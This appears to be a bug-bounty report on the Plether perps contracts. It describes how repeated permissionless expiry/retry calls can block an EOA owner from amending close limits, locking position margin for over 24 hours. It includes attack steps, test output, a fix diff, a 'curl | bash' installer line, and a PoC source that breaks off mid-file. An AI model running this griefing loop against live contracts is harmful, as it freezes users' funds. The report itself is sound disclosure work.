# \#99304 [SC-High] Permissionless protection retry loop can block EOA position exits for over 24 hours

**Submitted on Nov 13th 2026 at 03:00:27 UTC by @xRakan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99304
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

### Summary

A protected position can become unrecoverable to its EOA owner when an otherwise executable normal-market close limit becomes insufficient in the oracle-frozen regime. In a matched public-Router test, a 5 USDG explicit-fee ceiling permits the same protection close in Friday Afternoon Deleveraging (FAD) mode, but the documented 50-basis-point frozen spread raises assessed explicit fees to 54.054 USDG. A permissionless caller can then atomically retry the failed close and maintain a live child for more than 24 hours, preventing the owner from reaching the MED-9 amendment path. The test leaves 1,985.500999 USDG of position margin inaccessible. A separate 20-basis-point reversal test measured a 20.990997 USDG worse settlement balance; that is not the loss measured in the 24-hour lock test.

## Root Cause

The owner amendment entrypoint authenticates the account owner, but only accepts `Latched` protections with no pending Router orders. The source implementation is linked at the exact lines below.

[PositionProtectionBook.sol, amendment gate, lines 315–328](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The owner check is enforced by `_ownedActiveProtection`: the supplied account must match the protection's recorded account. The amendment then rejects `Triggered`, and also rejects any `Latched` state with a pending order. [PositionProtectionBook.sol, owner check, lines 983–991](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L983-L991)

Retry is permissionless. It requires the protection to be `Latched` and the account queue to be empty, then asks the Router to create a fresh child and records that child as the current attempt. It does not check that the caller owns the protected account.

[PositionProtectionBook.sol, retry entrypoint, lines 382–405](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }

    if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
        revert PositionProtectionBook__InvalidLinkedOrder();
    }
    uint64 expectedOrderId = router.nextCommitId();
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    if (linkedOrderId != expectedOrderId) {
        revert PositionProtectionBook__InvalidHostResponse();
    }
    _recordCloseAttempt(protection, linkedOrderId);
}
```

The generated close copies the stored four financial ceilings into the child order. The child keeps that committed policy even if the owner later changes stored limits; an amendment affects a future retry. Each retry receives the Router's maximum execution window, which is 60 seconds in this source configuration.

[OrderLiquidationBatchLogic.sol, retry bounds, lines 655–680](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L680)  
[OrderExecutionOrchestrator.sol, default window, lines 10–14](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L10-L14)

The second reproduction isolates a legitimate later mode change. The release close execution fee is 4 basis points and the frozen-close spread is 50 basis points. `CloseAccountingLib` assesses both on the close notional; `CfdOrderPolicyEvaluatorBase` adds them into `explicitFeesAssets` and compares that value with the order's stored `maxExplicitFeesAssets`. The normal and Friday Afternoon Deleveraging (FAD) control pays 4.004 USDG within its 5 USDG limit. The same-size protected position is then attempted in Frozen mode: the receipt records 54.054 USDG against that same 5 USDG limit and fails specifically with `ConstraintKind.ExplicitFees`. The user's ceiling is enforced as designed; the defect is that the owner cannot amend it once the protection is returned to `Latched` and permissionlessly retried.

[CloseAccountingLib.sol, execution fee and frozen spread formula, lines 120–126](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L126)  
[CfdOrderPolicyEvaluatorBase.sol, close fee aggregation, lines 409–416](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L409-L416)  
[CfdOrderPolicyEvaluatorBase.sol, financial-bound enforcement, lines 495–515](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L495-L515)  
[SECURITY.md, documented frozen-close spread, lines 1332–1335](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1332-L1335)

Retry changes the protection status to `Triggered` while the child is live. If that attempt fails or expires while the exact protected position remains, the failure handler returns the protection to `Latched`. The loop is therefore:

`Latched` → permissionless retry → `Triggered` → permissionless expiry → `Latched`

[PositionProtectionBook.sol, child registration, lines 565–578](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L565-L578)  
[PositionProtectionBook.sol, failure relatch, lines 637–668](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L668)  
[OrderRouter.sol, public expiry entrypoint, lines 191–196](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L196)  
[OrderRouterExecutionSidecar.sol, expiry settlement, lines 371–394](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L371-L394)

Expiry is permitted only after the stored deadline; the lifecycle book sets that deadline from the committed execution window. [OrderLifecycleBook.sol, deadline creation, lines 287–295](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderLifecycleBook.sol#L287-L295)

The protection is an account-level trade lock. The ordinary V3 commit path rejects a new order when an active protection exists. Triggered and Latched protections cannot use the normal cancellation path, and `cancelPositionProtectionAndCommitClose` accepts only `Armed`. [OrderLiquidationBatchLogic.sol, active-protection guard, lines 302–315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L302-L315) [PositionProtectionBook.sol, cancellation state guard, lines 408–428](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L428) [PositionProtectionBook.sol, cancel-and-close state guard, lines 341–359](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L359)

The resulting impact is limited to funds committed to the open position and the owner's ability to exit. The owner can still withdraw free settlement assets. The withdrawal path rejects an amount that would leave less than required locked margin. [MarginClearinghouse.sol, withdrawal entrypoints, lines 403–417](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L403-L417) [MarginClearinghouse.sol, locked-margin checks, lines 441–477](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L441-L477)

## Preconditions and Attack Path

### Preconditions

- The victim has a live position with an active protection whose trigger has already been recorded.
- The owner configures a finite but executable normal-market or Friday Afternoon Deleveraging (FAD) explicit-fee ceiling; in the supplemental test the ceiling is 5 USDG and the live/FAD close fee is 4.004 USDG.
- A child remains pending across the Friday close-only transition and reaches the frozen-market boundary. The release frozen-close spread is 50 basis points.
- The attacker can call the permissionless Router and protection entrypoints and fund repeated transactions; no owner, oracle-publisher, or keeper privilege is required.
- The owner is a standard EOA without an account-level batching mechanism. The attack wins only when the third-party expiry/retry transaction is sequenced before an owner recovery transaction at an available `Latched` boundary.
- A successful close within the committed bounds, a wallet that atomically expires and amends, or an owner transaction sequenced first can end the lock. The PoC does not establish transaction priority or continuous real-world inclusion.

### Calls

1. The owner opens matched public-V3 SHORT positions and gives both protections the same limits: maximum execution notional 10,020 USDG, maximum explicit fees 5 USDG, and permissive values for the other two bounds.
2. Before the frozen-market boundary, the control's protected close executes in FAD mode with 4.004 USDG of explicit execution fees and no frozen spread. This proves the stored limit is initially executable.
3. The victim's protected child is committed shortly before the Friday market-freeze boundary. A third party waits until the child expires at that boundary, then calls `expireOrder` and `retryPositionProtectionClose` in one transaction.
4. The third party executes the replacement child in Frozen mode and immediately retries in the same transaction after the close fails. The authenticated receipt reports 54.054 USDG of explicit fees against the unchanged 5 USDG ceiling; the 50.05 USDG increase is the frozen spread on the 10,010 USDG notional.
5. The protection ends the transaction in `Triggered` with a live child. The EOA cannot amend, cancel, or commit an ordinary close. The attacker then repeats permissionless expiry/retry cycles for 86,437 seconds during the frozen weekend window.
6. An owner-authorized batching account can instead atomically expire the child and amend the stored limits; the existing contract-wallet PoC proves this escape. It does not create an Ethereum Improvement Proposal 7702 (EIP-7702) authorization transaction.

The local test chooses the transaction order and advances block time; it proves the state transition and accounting, not sequencer preference, public-mempool priority, or guaranteed attacker inclusion. A standard EOA cannot atomically expire the child and amend through a helper because the amendment checks `msg.sender` against the protected account. The attack relies on the permissionless expiry/retry transaction being sequenced before owner recovery each time a live child expires. A smart account can batch recovery and a successful keeper close can end the lock.

## Impact Details
| Measurement | Reproduced result |
| --- | ---: |
| Matched explicit-fee ceiling | 5.000000 USDG |
| Pre-freeze Friday Afternoon Deleveraging (FAD) control fee | 4.004000 USDG; close executes with zero frozen spread |
| Frozen-mode assessed explicit fees | 54.054000 USDG; execution fails against the 5.000000 USDG ceiling |
| Frozen-spread component | 50.050000 USDG (50 basis points on 10,010 USDG notional) |
| Continuous EOA lock in frozen market | 86,437 seconds (24 hours and 37 seconds) |
| Permissionless expiry/retry cycles | 1,417 |
| Position margin left locked | 1,985.500999 USDG |
| EVM call gas per expiry/retry pair | 1,086,812 gas, excluding transaction intrinsic gas and Layer 1 data fees |
| Separate matched reversal balance difference | 20.990997 USDG after a 20-basis-point price reversal |

The frozen-spread test uses two matched 10,000-unit SHORT positions with identical stored limits. Just before the frozen-market boundary, BOB's protected close executes in FAD mode: the explicit fee is 4.004000 USDG, the frozen spread is zero, and the 5 USDG ceiling is satisfied. ALICE's protected close is committed shortly before the same boundary and is left pending until expiry. A permissionless bot expires and retries it atomically at the boundary. In Frozen mode the same close assessment is 54.054000 USDG, comprising the 4.004000 USDG normal execution fee and 50.050000 USDG frozen spread. The terminal receipt identifies `ExplicitFees`, with actual 54.054000 USDG and limit 5.000000 USDG. The bot retries in the same transaction after this failure and then expires/retries each child for 86,437 seconds while the market remains frozen.

This is the primary realistic limit scenario: the owner-supplied fee ceiling permits an actual close in the control before the regime changes. The original 10,005 USDG versus 10,010 USDG notional test remains a separate deterministic demonstration of the lock mechanism; its ceiling is already insufficient at trigger time and it is not presented as evidence for the new valid-at-trigger condition.

The frozen-spread 24-hour test leaves 1,985.500999 USDG in the open position's margin bucket. A separate withdrawal test verifies that free settlement can still be withdrawn, a request for the position-margin amount reverts without token transfer, and the released settlement can be withdrawn after owner amendment and a normal close. The impact is the blocked exit and inaccessible position margin, not a freeze of every settlement asset in the account or a direct theft.

The 20.990997 USDG matched balance difference comes from a separate scenario: identical 10,000-unit positions exit on opposite sides of a 20-basis-point price reversal after one owner amends and the other does not. It is not the financial loss measured during the frozen 24-hour run, is not pure price profit and loss, and is not attacker profit.

High maps to the demonstrated temporary freeze of funds for at least 24 hours (Scope row 6400). The assessment remains conditional: the attacker must send about one transaction every 61 seconds, keep winning transaction ordering at recovery boundaries, and avoid a successful close. The measured pair of calls consumes 1,086,812 gas, or about 1.54 billion call gas for 1,417 cycles. At Arbitrum One's [currently documented 0.02 gwei minimum Layer 2 (L2) gas price](https://docs.arbitrum.io/chain-info), this call gas alone converts to 0.03080025208 ETH before transaction overhead and L1 data fees; this is a lower-bound conversion, not measured spend. The attacker receives no bounty. The [Scope no-profit attack-cost rule](https://immunefi.com/audit-competition/plether/scope/) could support Medium Griefing if actual costs outweigh the damage assessable from the secondary reversal and the conditional capital lock; the whole locked margin is not treated as a realized loss. A successful keeper close within limits, an owner transaction sequenced first, or the demonstrated atomic wallet recovery ends the lock. No direct-theft or insolvency impact is claimed.

## Relation to Known Issues

**Cecuro MED-9 (marked Addressed).** The [published finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf) concerned missing trader-selected financial ceilings on initial protection closes and permissionless retries. Its report marks that issue addressed and describes the owner amendment added for `Latched` protections; it also notes that a tight ceiling may prevent execution until market conditions improve or the owner changes the ceiling. The pinned code now stores and copies all four configured ceilings into both initial and retried closes. This report does not claim that missing ceilings are still present. It concerns the recovery boundary: the amendment path only accepts `Latched` with no pending order, while the retry remains permissionless and changes the state back to `Triggered`. The demonstrated repeated retry therefore prevents the owner from using the MED-9 remedy during the pending child.

**AI-scan finding (Low): [“Protection trigger bounty is paid before a zero-bounty close is executed.”](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L542-L548)** That finding describes a caller receiving a one-time trigger bounty before a close executes, then potentially abandoning the zero-bounty close and leaving the protection active. The present PoC does not rely on trigger-bounty payment, abandonment after triggering, or an unpaid keeper. Its attacker spends gas to call expiry and retry repeatedly, keeping the owner amendment unavailable. The shared Triggered/Latched irreversibility and zero-bounty retry behavior are acknowledged as overlap. The retry constructor sets the child maximum execution bounty to zero. [OrderLiquidationBatchLogic.sol, retry bounds, lines 655–680](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L680)

**AI-scan finding (Info): [“Failed protection attempts unconditionally pay the bounty instead of retaining it for retry.”](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L800-L806)** That finding concerns terminal bounty accounting. The reproduced retry child has a zero bounty, the production retry host enforces that value, and this report claims no bounty transfer or accounting loss. The finding is adjacent to expiry handling but is not the root cause or impact demonstrated here.

**Published protection behavior and incomplete MED-9 remedy.** The repository documentation describes permissionless retries, irreversible protection triggering, and the account-level trade lock. It also states that the owner may amend limits only while `Latched` and no Router order is pending. It does not identify the interaction demonstrated here: repeated third-party expiry/retry transactions can continuously prevent an EOA owner from reaching the amendment mechanism added to address MED-9. The vulnerability is the inability to exercise that recovery route under adversarial transaction ordering, not the documented protection lifecycle itself. The underlying irreversibility, lock, permissionless retry, and frozen spread are disclosed; this report does not present those individual behaviors as new. The competition's published known-issue and public-disclosure rules leave the incomplete-fix distinction material.

[Canonical protection entrypoints, lines 142–148](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L142-L148)  
[SECURITY.md, irreversible protection state and retry, lines 547–555](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L555)

**Monitoring blind spot described in SECURITY.md.** The runbook tells operators to alert on a prolonged `Latched` protection with no live child. In the PoC, the attacker's same-transaction expiry/retry sequence leaves the persisted state `Triggered` with one live child after each transaction, so that specific current-state alert predicate may never remain true long enough to fire. The Book also emits a failed-attempt event during the transition; this PoC does not test off-chain event monitoring and does not claim all production monitoring is bypassed.

[SECURITY.md, alert condition, lines 1356–1359](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359)  
[PositionProtectionBook.sol, Triggered child state, lines 565–575](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L565-L575)  
[PositionProtectionBook.sol, failed-attempt event and relatch, lines 662–668](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L662-L668)

## Mitigation

### Recommended change

Permit the owner to amend the stored close ceilings while exactly one matching protection child is pending. Keep the current child's committed execution bounds immutable; the amended ceilings apply only if that child fails or expires and a later retry is created. Continue to require the owner account for the amendment, reject inconsistent child mappings and any unexpected pending-order count, and keep cancellation restricted to its existing states.

```diff
diff --git a/packages/perps/src/PositionProtectionBook.sol b/packages/perps/src/PositionProtectionBook.sol
index 08359c0f..86117a68 100644
--- a/packages/perps/src/PositionProtectionBook.sol
+++ b/packages/perps/src/PositionProtectionBook.sol
@@ -317,12 +317,22 @@ contract PositionProtectionBook is IPositionProtectionBook, IOrderRouterErrors,
         PositionProtectionTypes.CloseFinancialLimits calldata limits
     ) external nonReentrant {
         StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
-        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
+        IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
+        if (protection.status == PositionProtectionTypes.PositionProtectionStatus.Latched) {
+            if (router.pendingOrderCounts(msg.sender) != 0) {
+                revert OrderRouter__PendingOrdersExist();
+            }
+        } else if (protection.status == PositionProtectionTypes.PositionProtectionStatus.Triggered) {
+            // The committed child retains its original financial bounds. Owner changes here apply to a later retry.
+            if (
+                protection.linkedOrderId == 0 || router.pendingOrderCounts(msg.sender) != 1
+                    || _attemptProtectionIds[protection.linkedOrderId] != protectionId
+            ) {
+                revert OrderRouter__PendingOrdersExist();
+            }
+        } else {
             revert OrderRouter__ProtectionNotLatched();
         }
-        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
-            revert OrderRouter__PendingOrdersExist();
-        }
         _setCloseLimits(protection, limits);
         _emitCloseLimitsUpdated(protection);
     }
diff --git a/packages/perps/src/interfaces/IPositionProtectionActions.sol b/packages/perps/src/interfaces/IPositionProtectionActions.sol
index bfad2783..63e2b128 100644
--- a/packages/perps/src/interfaces/IPositionProtectionActions.sol
+++ b/packages/perps/src/interfaces/IPositionProtectionActions.sol
@@ -29,8 +29,8 @@ interface IPositionProtectionActions {
         PositionProtectionTypes.PositionProtectionParams calldata params
     ) external;
 
-    /// @notice Lets the owner change close limits after a failed attempt relatches, before a fresh retry.
-    /// @dev The trigger and any terminal attempts remain recorded. A live child cannot be changed.
+    /// @notice Lets the owner amend stored close limits after an attempt fails or while one child is pending.
+    /// @dev A pending child's committed bounds remain unchanged; an amendment while `Triggered` applies to a later retry.
     function amendLatchedPositionProtectionCloseLimits(
         uint64 protectionId,
         PositionProtectionTypes.CloseFinancialLimits calldata limits
```

## References
- [Plether Audit Competition scope and impact definitions](https://immunefi.com/audit-competition/plether/scope/)
- [Plether Audit Competition resources and pinned repository](https://immunefi.com/audit-competition/plether/resources/)
- [Cecuro AI audit report, including MED-9](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [AI-scan findings in the pinned repository](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L542-L548)
- [AI-scan failed protection bounty finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L800-L806)
- [Canonical protection entrypoints in the pinned repository](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L142-L148)
- [Published security description of protection locks and retries](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L551)
- [Frozen spread accounting formula in the pinned source](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L120-L126)
- [Explicit fee aggregation and enforcement in the pinned source](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L409-L416)
- [Weekend oracle-frozen calendar in the pinned source](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L23-L48)
- [Documented frozen-close spread policy](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1332-L1335)
- [Documented Latched-without-child alert condition](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359)
- [Repository test Router adapter and production inheritance](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/utils/LegacyOrderRouterHarness.sol#L9-L40)
- [Package Foundry configuration: Solidity 0.8.35 and via-IR](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/foundry.toml#L17-L21)
- [Arbitrum One chain parameters and minimum gas price](https://docs.arbitrum.io/chain-info)
- [Arbitrum transaction fee components](https://docs.arbitrum.io/build-decentralized-apps/troubleshooting-building)


## Proof of Concept

## Proof of Concept
### Environment and clean-checkout reproduction

The proof uses Solidity 0.8.35 and Foundry 1.8.3; `packages/perps/foundry.toml` enables optimizer and via-IR. The primary PoC source uses the repository's concrete `PositionProtectionTest` fixture. That fixture instantiates the test-only `LegacyOrderRouterHarness`, a subclass of the production `OrderRouter`; the PoC uses the inherited V3 `commitOrder(OrderRequest)` path and production execution, protection, and expiry functions. It does not call the test-only scalar-commit adapter. The test uses the repository's local Pyth and USDG doubles; it does not modify in-scope production contracts or use a fork/RPC endpoint.

[LegacyOrderRouterHarness.sol, test-only adapter inherits production OrderRouter, lines 9–40](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/utils/LegacyOrderRouterHarness.sol#L9-L40)

The main PoC sets launch risk parameters from [packages/perps/DEPLOYMENT.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L128-L143), plus the release 4-basis-point execution fee and 50-basis-point frozen-close spread. Its final test uses the canonical Friday/Saturday frozen-market interval from [`MarketCalendarLib`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/MarketCalendarLib.sol#L23-L48). The test advances local block time through this source-defined window; it does not model real-world sequencer priority or a live market price stream.

Install Foundry 1.8.3 using the [official installation instructions](https://getfoundry.sh/introduction/installation):

```sh
curl -L https://foundry.paradigm.xyz | bash
foundryup --install 1.8.3
```

Clone the official repository, check out the frozen commit, and initialize its pinned submodules:

```sh
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps
```

Save the complete Solidity source below at `packages/perps/test/perps/PositionProtectionRetryLockoutPoC.t.sol`. The package pins Solidity 0.8.35. If that compiler is not installed, run `forge build --root packages/perps` once with network access so Foundry can obtain it; then clear generated artifacts with `forge clean --root packages/perps`. The reproduction command below was run after `forge clean` in a fresh checkout and compiled from source with default `out/` and `cache/` locations.

```sh
forge clean --root packages/perps
FOUNDRY_FFI=false FOUNDRY_FUZZ_SEED=0x7f3e91a2c5d6084b forge test --offline --root packages/perps --match-path test/perps/PositionProtectionRetryLockoutPoC.t.sol --match-test 'PublicRouter|SmartWallet|LockedPositionMargin|FrozenSpread' --gas-limit 2000000000 -vv
```

The exact clean-checkout run compiled 239 files with Solidity 0.8.35, passed all seven selected PoC tests, and exited 0. The actual test output excerpt is:

```text
Ran 7 tests for test/perps/PositionProtectionRetryLockoutPoC.t.sol:PositionProtectionRetryLockoutPoCTest
[PASS] test_LockedPositionMarginCannotBeWithdrawnUntilOwnerRecovers() (gas: 9650897)
[PASS] test_PublicRouter_BaselineOwnerAmendsAndExits() (gas: 8833313)
[PASS] test_PublicRouter_EoaCanBeKeptLockedFor24HoursByActualCalls() (gas: 1553531268)
Logs:
  duration_seconds: 86437
  expiry_retry_cycles: 1417
  position_margin_locked_assets: 1985500999
  first_cycle_call_gas_excluding_tx_intrinsic: 1086812
  average_cycle_call_gas_excluding_tx_intrinsic: 1086812

[PASS] test_PublicRouter_ExpiryBoundaryAndEoaOrderingRace() (gas: 9230182)
[PASS] test_PublicRouter_FrozenSpreadMakesInitiallyExecutableFeeLimitFailAndLocksFor24Hours() (gas: 1594212077)
Logs:
  live_control_execution_fee_assets: 4004000
  frozen_failure_explicit_fee_assets: 54054000
  frozen_failure_limit_assets: 5000000
  frozen_spread_component_assets: 50050000
  frozen_close_spread_bps: 50
  frozen_lock_duration_seconds: 86437
  frozen_expiry_retry_cycles: 1417
  frozen_position_margin_locked_assets: 1985500999
  frozen_first_cycle_call_gas: 1086812
  frozen_average_cycle_call_gas: 1086812

[PASS] test_PublicRouter_MatchedShortPathMeasuresIncrementalVictimLoss() (gas: 17273294)
Logs:
  control_start_balance: 20000000000
  control_end_balance: 20001595999
  attack_start_balance: 20000000000
  attack_end_balance: 19980605002
  incremental_victim_loss_vs_control: 20990997
  reversal_basis_points: 20

[PASS] test_SmartWallet_AtomicExpireAmendThenCloseEscapes() (gas: 10671968)
Suite result: ok. 7 passed; 0 failed; 0 skipped; finished in 11.73s (23.28s CPU time)

Ran 1 test suite in 11.73s (11.73s CPU time): 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

### Test coverage and negative controls

| Test | Demonstrated behavior |
| --- | --- |
| `test_PublicRouter_BaselineOwnerAmendsAndExits` | Normal owner amendment from `Latched`, permissionless retry, and full close succeed. |
| `test_PublicRouter_EoaCanBeKeptLockedFor24HoursByActualCalls` | Original notional-bound lock reproduction; its 10,005 USDG ceiling is already below the 10,010 USDG close notional at trigger time. This remains a separate control, not the initially-valid-limit scenario. |
| `test_PublicRouter_ExpiryBoundaryAndEoaOrderingRace` | Expiry fails at the exact deadline and succeeds at deadline plus one second; a separate retry re-enters `Triggered`. |
| `test_SmartWallet_AtomicExpireAmendThenCloseEscapes` | An owner-authorized contract wallet batches expiry and amendment, then recovers and closes. |
| `test_PublicRouter_MatchedShortPathMeasuresIncrementalVictimLoss` | Separate 20-basis-point reversal scenario; its 20.990997 USDG balance difference is not the 24-hour freeze loss or attacker profit. |
| `test_LockedPositionMarginCannotBeWithdrawnUntilOwnerRecovers` | Free settlement is withdrawable; the pledged position margin is not; recovery and close release withdrawable funds. |
| `test_PublicRouter_FrozenSpreadMakesInitiallyExecutableFeeLimitFailAndLocksFor24Hours` | Matched control passes a 5 USDG fee ceiling in FAD; the same stored limit fails after the 50-basis-point frozen spread is applied; expiry/retry sustains a 24-hour lock. |

The 20.990997 USDG matched settlement-balance difference is secondary evidence from the separate 20-basis-point reversal test. It is not measured during either 24-hour lock test, is not pure price profit and loss, and is not attacker profit.

### Complete Solidity PoC

Save this entire source file at `packages/perps/test/perps/PositionProtectionRetryLockoutPoC.t.sol`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IRetryLockExpiryRouter {

    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory);

}

interface IRetryLockBook {

    function retryPositionProtectionClose(
